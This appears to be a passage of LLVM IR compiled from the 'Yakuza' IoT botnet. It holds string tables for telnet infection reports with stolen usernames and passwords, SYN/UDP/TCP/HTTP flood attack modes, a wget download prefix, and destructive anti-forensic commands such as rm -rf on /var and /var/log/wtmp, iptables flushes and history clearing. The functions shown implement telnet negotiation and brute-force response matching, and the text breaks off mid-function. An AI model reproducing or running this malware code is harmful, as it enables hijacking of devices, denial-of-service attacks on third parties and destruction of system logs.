@.str.123 = private unnamed_addr constant [7 x i8] c"LINKED\00", align 1
@.str.124 = private unnamed_addr constant [84 x i8] c"[ Yakuza ] Infection Success || IP: %s: || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.125 = private unnamed_addr constant [72 x i8] c"[ Yakuza ] Failed || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@SendSTD.randstrings = private unnamed_addr constant [26 x i8*] [i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.126, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.127, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.129, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.130, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.131, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.134, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.135, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.136, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.137, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.138, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.139, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.140, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.141, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.142, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.143, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.144, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.145, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.146, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.147, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.148, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.149, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.150, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.151, i32 0, i32 0)], align 16
@.str.126 = private unnamed_addr constant [21 x i8] c"PozHlpiND4xPDPuGE6tq\00", align 1
@.str.127 = private unnamed_addr constant [21 x i8] c"tg57YSAcuvy2hdBlEWMv\00", align 1
@.str.128 = private unnamed_addr constant [21 x i8] c"VaDp3Vu5m5bKcfCU96RX\00", align 1
@.str.129 = private unnamed_addr constant [21 x i8] c"UBWcPjIZOdZ9IAOSZAy6\00", align 1
@.str.130 = private unnamed_addr constant [21 x i8] c"JezacHw4VfzRWzsglZlF\00", align 1
@.str.131 = private unnamed_addr constant [21 x i8] c"3zOWSvAY2dn9rKZZOfkJ\00", align 1
@.str.132 = private unnamed_addr constant [21 x i8] c"oqogARpMjAvdjr9Qsrqj\00", align 1
@.str.133 = private unnamed_addr constant [21 x i8] c"yQAkUvZFjxExI3WbDp2g\00", align 1
@.str.134 = private unnamed_addr constant [21 x i8] c"35arWHE38SmV9qbaEDzZ\00", align 1
@.str.135 = private unnamed_addr constant [21 x i8] c"kKbPlhAwlxxnyfM3LaL0\00", align 1
@.str.136 = private unnamed_addr constant [21 x i8] c"a7pInUoLgx1CPFlGB5JF\00", align 1
@.str.137 = private unnamed_addr constant [21 x i8] c"yFnlmG7bqbW682p7Bzey\00", align 1
@.str.138 = private unnamed_addr constant [21 x i8] c"S1mQMZYF6uLzzkiULnGF\00", align 1
@.str.139 = private unnamed_addr constant [21 x i8] c"jKdmCH3hamvbN7ZvzkNA\00", align 1
@.str.140 = private unnamed_addr constant [21 x i8] c"bOAFqQfhvMFEf9jEZ89M\00", align 1
@.str.141 = private unnamed_addr constant [21 x i8] c"VckeqgSPaAA5jHdoFpCC\00", align 1
@.str.142 = private unnamed_addr constant [21 x i8] c"CwT01MAGqrgYRStHcV0X\00", align 1
@.str.143 = private unnamed_addr constant [21 x i8] c"72qeggInemBIQ5uJc1jQ\00", align 1
@.str.144 = private unnamed_addr constant [21 x i8] c"zwcfbtGDTDBWImROXhdn\00", align 1
@.str.145 = private unnamed_addr constant [21 x i8] c"w70uUC1UJYZoPENznHXB\00", align 1
@.str.146 = private unnamed_addr constant [21 x i8] c"EoXLAf1xXR7j4XSs0JTm\00", align 1
@.str.147 = private unnamed_addr constant [21 x i8] c"lgKjMnqBZFEvPJKpRmMj\00", align 1
@.str.148 = private unnamed_addr constant [21 x i8] c"lSvZgNzxkUyChyxw1nSr\00", align 1
@.str.149 = private unnamed_addr constant [21 x i8] c"VQz4cDTxV8RRrgn00toF\00", align 1
@.str.150 = private unnamed_addr constant [13 x i8] c"YakuzaBotnet\00", align 1
@.str.151 = private unnamed_addr constant [13 x i8] c"Scarface1337\00", align 1
@.str.152 = private unnamed_addr constant [4 x i8] c"ALL\00", align 1
@.str.153 = private unnamed_addr constant [5 x i8] c"USYN\00", align 1
@.str.154 = private unnamed_addr constant [5 x i8] c"ASYN\00", align 1
@.str.155 = private unnamed_addr constant [2 x i8] c"-\00", align 1
@.str.156 = private unnamed_addr constant [4 x i8] c"SYN\00", align 1
@.str.157 = private unnamed_addr constant [4 x i8] c"RST\00", align 1
@.str.158 = private unnamed_addr constant [4 x i8] c"FIN\00", align 1
@.str.159 = private unnamed_addr constant [4 x i8] c"ACK\00", align 1
@.str.160 = private unnamed_addr constant [4 x i8] c"PSH\00", align 1
@.str.161 = private unnamed_addr constant [4 x i8] c"URG\00", align 1
@.str.162 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.163 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.164 = private unnamed_addr constant [285 x i8] c"\84\8B\87\8F\99\8F\98\9C\8F\98\84\8B\87\8F\99\8F\98\9C\8F\98\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\00", align 1
@.str.165 = private unnamed_addr constant [48 x i8] c"Yakuza Botnet HTTP Flood In Progress. Fuck you.\00", align 1
@.str.166 = private unnamed_addr constant [43 x i8] c"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*\00", align 1
@.str.167 = private unnamed_addr constant [21 x i8] c"rm -rf /var/log/wtmp\00", align 1
@.str.168 = private unnamed_addr constant [14 x i8] c"rm -rf /tmp/*\00", align 1
@.str.169 = private unnamed_addr constant [20 x i8] c"rm -rf /bin/netstat\00", align 1
@.str.170 = private unnamed_addr constant [12 x i8] c"iptables -F\00", align 1
@.str.171 = private unnamed_addr constant [17 x i8] c"pkill -9 busybox\00", align 1
@.str.172 = private unnamed_addr constant [14 x i8] c"pkill -9 perl\00", align 1
@.str.173 = private unnamed_addr constant [16 x i8] c"pkill -9 python\00", align 1
@.str.174 = private unnamed_addr constant [22 x i8] c"service iptables stop\00", align 1
@.str.175 = private unnamed_addr constant [37 x i8] c"/sbin/iptables -F; /sbin/iptables -X\00", align 1
@.str.176 = private unnamed_addr constant [23 x i8] c"service firewalld stop\00", align 1
@.str.177 = private unnamed_addr constant [23 x i8] c"rm -rf ~/.bash_history\00", align 1
@.str.178 = private unnamed_addr constant [11 x i8] c"history -c\00", align 1
@.str.179 = private unnamed_addr constant [45 x i8] c"wget --no-check-certificate -q -O /tmp/null \00", align 1
@.str.180 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.181 = private unnamed_addr constant [5 x i8] c"ICMP\00", align 1
@.str.182 = private unnamed_addr constant [7 x i8] c"TELNET\00", align 1
@.str.183 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.184 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.185 = private unnamed_addr constant [6 x i8] c"FLOAD\00", align 1
@.str.186 = private unnamed_addr constant [21 x i8] c"FLoad Mode Activated\00", align 1
@.str.187 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.188 = private unnamed_addr constant [8 x i8] c"HTTPHEX\00", align 1
@.str.189 = private unnamed_addr constant [8 x i8] c"HTTPTXT\00", align 1
@.str.190 = private unnamed_addr constant [5 x i8] c"WGET\00", align 1
@.str.191 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.192 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.193 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.194 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.195 = private unnamed_addr constant [6 x i8] c"CLEAN\00", align 1
@.str.196 = private unnamed_addr constant [19 x i8] c"[Cleaning] [%s:%s]\00", align 1
@.str.199 = private unnamed_addr constant [11 x i8] c"BIG_ENDIAN\00", align 1
@.str.200 = private unnamed_addr constant [14 x i8] c"LITTLE_ENDIAN\00", align 1
@.str.201 = private unnamed_addr constant [13 x i8] c"BIG_ENDIAN_W\00", align 1
@.str.202 = private unnamed_addr constant [16 x i8] c"LITTLE_ENDIAN_W\00", align 1
@.str.203 = private unnamed_addr constant [8 x i8] c"UNKNOWN\00", align 1
@.str.197 = private unnamed_addr constant [17 x i8] c"/etc/resolv.conf\00", align 1
@.str.198 = private unnamed_addr constant [39 x i8] c"nameserver 8.8.8.8\0Anameserver 8.8.4.4\0A\00", align 1
@.str.204 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.205 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.206 = private unnamed_addr constant [55 x i8] c"[\1B[96mBOT JOINED\1B[97m] Arch: \1B[96m%s \1B[97m|| Type: %s]\00", align 1
@.str.207 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.208 = private unnamed_addr constant [2 x i8] c" \00", align 1

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.53, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %10

; <label>:10:                                     ; preds = %31, %1
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  br i1 %12, label %13, label %34

; <label>:13:                                     ; preds = %10
  %14 = load i32, i32* %3, align 4
  %15 = sub nsw i32 %14, 3
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %16
  %18 = load i32, i32* %17, align 4
  %19 = load i32, i32* %3, align 4
  %20 = sub nsw i32 %19, 2
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %21
  %23 = load i32, i32* %22, align 4
  %24 = xor i32 %18, %23
  %25 = xor i32 %24, -1640531527
  %26 = load i32, i32* %3, align 4
  %27 = xor i32 %25, %26
  %28 = load i32, i32* %3, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %29
  store i32 %27, i32* %30, align 4
  br label %31

; <label>:31:                                     ; preds = %13
  %32 = load i32, i32* %3, align 4
  %33 = add nsw i32 %32, 1
  store i32 %33, i32* %3, align 4
  br label %10

; <label>:34:                                     ; preds = %10
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  %27 = load i32, i32* @c, align 4
  %28 = icmp ult i32 %26, %27
  br i1 %28, label %29, label %34

; <label>:29:                                     ; preds = %0
  %30 = load i32, i32* %3, align 4
  %31 = add i32 %30, 1
  store i32 %31, i32* %3, align 4
  %32 = load i32, i32* @c, align 4
  %33 = add i32 %32, 1
  store i32 %33, i32* @c, align 4
  br label %34

; <label>:34:                                     ; preds = %29, %0
  %35 = load i32, i32* %4, align 4
  %36 = load i32, i32* %3, align 4
  %37 = sub i32 %35, %36
  %38 = load i32, i32* @rand_cmwc.i, align 4
  %39 = zext i32 %38 to i64
  %40 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %39
  store i32 %37, i32* %40, align 4
  ret i32 %37
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_string(i8*, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %8

; <label>:8:                                      ; preds = %16, %2
  %9 = load i8**, i8*** %5, align 8
  %10 = load i32, i32* %6, align 4
  %11 = add nsw i32 %10, 1
  store i32 %11, i32* %6, align 4
  %12 = sext i32 %11 to i64
  %13 = getelementptr inbounds i8*, i8** %9, i64 %12
  %14 = load i8*, i8** %13, align 8
  %15 = icmp ne i8* %14, null
  br i1 %15, label %16, label %17

; <label>:16:                                     ; preds = %8
  br label %8

; <label>:17:                                     ; preds = %8
  store i32 0, i32* %7, align 4
  br label %18

; <label>:18:                                     ; preds = %33, %17
  %19 = load i32, i32* %7, align 4
  %20 = load i32, i32* %6, align 4
  %21 = icmp slt i32 %19, %20
  br i1 %21, label %22, label %36

; <label>:22:                                     ; preds = %18
  %23 = load i8*, i8** %4, align 8
  %24 = load i8**, i8*** %5, align 8
  %25 = load i32, i32* %7, align 4
  %26 = sext i32 %25 to i64
  %27 = getelementptr inbounds i8*, i8** %24, i64 %26
  %28 = load i8*, i8** %27, align 8
  %29 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %23, i8* %28)
  %30 = icmp ne i32 %29, 0
  br i1 %30, label %31, label %32

; <label>:31:                                     ; preds = %22
  store i32 1, i32* %3, align 4
  br label %37

; <label>:32:                                     ; preds = %22
  br label %33

; <label>:33:                                     ; preds = %32
  %34 = load i32, i32* %7, align 4
  %35 = add nsw i32 %34, 1
  store i32 %35, i32* %7, align 4
  br label %18

; <label>:36:                                     ; preds = %18
  store i32 0, i32* %3, align 4
  br label %37

; <label>:37:                                     ; preds = %36, %31
  %38 = load i32, i32* %3, align 4
  ret i32 %38
}

declare i32 @strcasestr(...) #1

; Function Attrs: noinline nounwind uwtable
define i32 @contains_success(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([18 x i8*], [18 x i8*]* @successes, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_fail(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @fails, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_response(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_success(i8* %3)
  %5 = icmp ne i32 %4, 0
  br i1 %5, label %10, label %6

; <label>:6:                                      ; preds = %1
  %7 = load i8*, i8** %2, align 8
  %8 = call i32 @contains_fail(i8* %7)
  %9 = icmp ne i32 %8, 0
  br label %10

; <label>:10:                                     ; preds = %6, %1
  %11 = phi i1 [ true, %1 ], [ %9, %6 ]
  %12 = zext i1 %11 to i32
  ret i32 %12
}

; Function Attrs: noinline nounwind uwtable
define i32 @read_with_timeout(i32, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca %struct.fd_set, align 8
  %11 = alloca %struct.timeval, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  %14 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i64 0, i64* %14, align 8
  %15 = load i32, i32* %7, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 %16, i64* %17, align 8
  br label %18

; <label>:18:                                     ; preds = %4
  %19 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %10, i32 0, i32 0
  %20 = getelementptr inbounds [16 x i64], [16 x i64]* %19, i64 0, i64 0
  %21 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %20) #5, !srcloc !1
  %22 = extractvalue { i64, i64* } %21, 0
  %23 = extractvalue { i64, i64* } %21, 1
  %24 = trunc i64 %22 to i32
  store i32 %24, i32* %12, align 4
  %25 = ptrtoint i64* %23 to i64
  %26 = trunc i64 %25 to i32
  store i32 %26, i32* %13, align 4
  br label %27

; <label>:27:                                     ; preds = %18
  %28 = load i32, i32* %6, align 4
  %29 = srem i32 %28, 64
  %30 = zext i32 %29 to i64
  %31 = shl i64 1, %30
  %32 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %10, i32 0, i32 0
  %33 = load i32, i32* %6, align 4
  %34 = sdiv i32 %33, 64
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [16 x i64], [16 x i64]* %32, i64 0, i64 %35
  %37 = load i64, i64* %36, align 8
  %38 = or i64 %37, %31
  store i64 %38, i64* %36, align 8
  %39 = load i32, i32* %6, align 4
  %40 = add nsw i32 %39, 1
  %41 = call i32 @select(i32 %40, %struct.fd_set* %10, %struct.fd_set* null, %struct.fd_set* null, %struct.timeval* %11)
  %42 = icmp slt i32 %41, 1
  br i1 %42, label %43, label %44

; <label>:43:                                     ; preds = %27
  store i32 0, i32* %5, align 4
  br label %51

; <label>:44:                                     ; preds = %27
  %45 = load i32, i32* %6, align 4
  %46 = load i8*, i8** %8, align 8
  %47 = load i32, i32* %9, align 4
  %48 = sext i32 %47 to i64
  %49 = call i64 @recv(i32 %45, i8* %46, i64 %48, i32 0)
  %50 = trunc i64 %49 to i32
  store i32 %50, i32* %5, align 4
  br label %51

; <label>:51:                                     ; preds = %44, %43
  %52 = load i32, i32* %5, align 4
  ret i32 %52
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #1

declare i64 @recv(i32, i8*, i64, i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @read_until_response(i32, i32, i8*, i32, i8**) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i32 %1, i32* %8, align 4
  store i8* %2, i8** %9, align 8
  store i32 %3, i32* %10, align 4
  store i8** %4, i8*** %11, align 8
  %14 = load i8*, i8** %9, align 8
  %15 = load i32, i32* %10, align 4
  %16 = sext i32 %15 to i64
  call void @llvm.memset.p0i8.i64(i8* %14, i8 0, i64 %16, i32 1, i1 false)
  %17 = load i32, i32* %7, align 4
  %18 = load i32, i32* %8, align 4
  %19 = load i8*, i8** %9, align 8
  %20 = load i32, i32* %10, align 4
  %21 = call i32 @read_with_timeout(i32 %17, i32 %18, i8* %19, i32 %20)
  store i32 %21, i32* %12, align 4
  %22 = load i8*, i8** %9, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 0
  %24 = load i8, i8* %23, align 1
  %25 = sext i8 %24 to i32
  %26 = icmp eq i32 %25, 255
  br i1 %26, label %27, label %31

; <label>:27:                                     ; preds = %5
  %28 = load i32, i32* %7, align 4
  %29 = load i8*, i8** %9, align 8
  %30 = call i32 @negotiate(i32 %28, i8* %29, i32 3)
  br label %31

; <label>:31:                                     ; preds = %27, %5
  %32 = load i8*, i8** %9, align 8
  %33 = load i8**, i8*** %11, align 8
  %34 = call i32 @contains_string(i8* %32, i8** %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %31
  store i32 1, i32* %6, align 4
  br label %38

; <label>:37:                                     ; preds = %31
  store i32 0, i32* %6, align 4
  br label %38

; <label>:38:                                     ; preds = %37, %36
  %39 = load i32, i32* %6, align 4
  ret i32 %39
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #2

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  switch i32 %12, label %61 [
    i32 255, label %13
    i32 251, label %14
    i32 252, label %14
    i32 253, label %14
    i32 254, label %14
  ]

; <label>:13:                                     ; preds = %3
  store i32 0, i32* %4, align 4
  br label %63

; <label>:14:                                     ; preds = %3, %3, %3, %3
  store i8 -1, i8* %8, align 1
  %15 = load i32, i32* %5, align 4
  %16 = call i64 @send(i32 %15, i8* %8, i64 1, i32 16384)
  %17 = load i8*, i8** %6, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 252, %20
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %14
  store i8 -2, i8* %8, align 1
  br label %54

; <label>:23:                                     ; preds = %14
  %24 = load i8*, i8** %6, align 8
  %25 = getelementptr inbounds i8, i8* %24, i64 1
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 254, %27
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %23
  store i8 -4, i8* %8, align 1
  br label %53

; <label>:30:                                     ; preds = %23
  %31 = load i8*, i8** %6, align 8
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = load i8, i8* %32, align 1
  %34 = zext i8 %33 to i32
  %35 = icmp eq i32 3, %34
  br i1 %35, label %36, label %44

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %6, align 8
  %38 = getelementptr inbounds i8, i8* %37, i64 1
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 253
  %42 = select i1 %41, i32 251, i32 253
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %8, align 1
  br label %52

; <label>:44:                                     ; preds = %30
  %45 = load i8*, i8** %6, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 253
  %50 = select i1 %49, i32 252, i32 254
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %8, align 1
  br label %52

; <label>:52:                                     ; preds = %44, %36
  br label %53

; <label>:53:                                     ; preds = %52, %29
  br label %54

; <label>:54:                                     ; preds = %53, %22
  %55 = load i32, i32* %5, align 4
  %56 = call i64 @send(i32 %55, i8* %8, i64 1, i32 16384)
  %57 = load i32, i32* %5, align 4
  %58 = load i8*, i8** %6, align 8
  %59 = getelementptr inbounds i8, i8* %58, i64 2
  %60 = call i64 @send(i32 %57, i8* %59, i64 1, i32 16384)
  br label %62

; <label>:61:                                     ; preds = %3
  br label %62

; <label>:62:                                     ; preds = %61, %54
  store i32 0, i32* %4, align 4
  br label %63

; <label>:63:                                     ; preds = %62, %13
  %64 = load i32, i32* %4, align 4
  ret i32 %64
}

declare i64 @send(i32, i8*, i64, i32) #1

; Function Attrs: noinline nounwind uwtable
define i8* @get_telstate_host(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  %3 = alloca %struct.in_addr, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 1
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  store i32 %6, i32* %7, align 4
  %8 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  %9 = load i32, i32* %8, align 4
  %10 = call i8* @inet_ntoa(i32 %9) #5
  ret i8* %10
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #3

; Function Attrs: noinline nounwind uwtable
define void @advance_telstate(%struct.telstate_t*, i32) #0 {
  %3 = alloca %struct.telstate_t*, align 8
  %4 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i32, i32* %4, align 4
  %6 = icmp eq i32 %5, 0
  br i1 %6, label %7, label %12

; <label>:7:                                      ; preds = %2
  %8 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %9 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %8, i32 0, i32 0
  %10 = load i32, i32* %9, align 8
  %11 = call i32 @close(i32 %10)
  br label %12

; <label>:12:                                     ; preds = %7, %2
  %13 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %14 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %13, i32 0, i32 7
  store i32 0, i32* %14, align 8
  %15 = load i32, i32* %4, align 4
  %16 = trunc i32 %15 to i8
  %17 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %18 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i32 0, i32 2
  store i8 %16, i8* %18, align 8
  %19 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
